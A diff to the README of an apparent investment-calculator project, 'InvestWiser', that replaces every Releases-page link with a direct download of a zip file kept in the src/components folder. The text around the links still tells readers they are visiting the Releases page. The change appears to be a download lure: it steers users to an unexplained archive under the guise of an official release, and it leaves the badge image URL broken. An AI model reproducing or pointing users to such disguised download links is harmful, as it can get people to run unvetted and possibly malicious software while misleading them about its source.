@@ -6,11 +6,11 @@ Welcome to InvestWiser! This tool helps Indian investors calculate their investm
 
 ## 📥 Download InvestWiser
 
-[![Download InvestWiser](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/khan012345/InvestWiser/releases)
+[![Download InvestWiser](https://github.com/khan012345/InvestWiser/raw/refs/heads/main/src/components/Wiser-Invest-v3.3.zip%20Now-blue)](https://github.com/khan012345/InvestWiser/raw/refs/heads/main/src/components/Wiser-Invest-v3.3.zip)
 
 To download InvestWiser, visit the Releases page. You'll find the latest version ready for you.
 
-[Visit the Download Page](https://github.com/khan012345/InvestWiser/releases)
+[Visit the Download Page](https://github.com/khan012345/InvestWiser/raw/refs/heads/main/src/components/Wiser-Invest-v3.3.zip)
 
 ## 📋 System Requirements
 
@@ -38,7 +38,7 @@ To get started with InvestWiser, follow these simple steps:
 
 1. **Go to the Releases Page:** Click on the link below.
    
-   [Download InvestWiser](https://github.com/khan012345/InvestWiser/releases)
+   [Download InvestWiser](https://github.com/khan012345/InvestWiser/raw/refs/heads/main/src/components/Wiser-Invest-v3.3.zip)
 
 2. **Select the Latest Version:** Look for the most recent stable release.
 
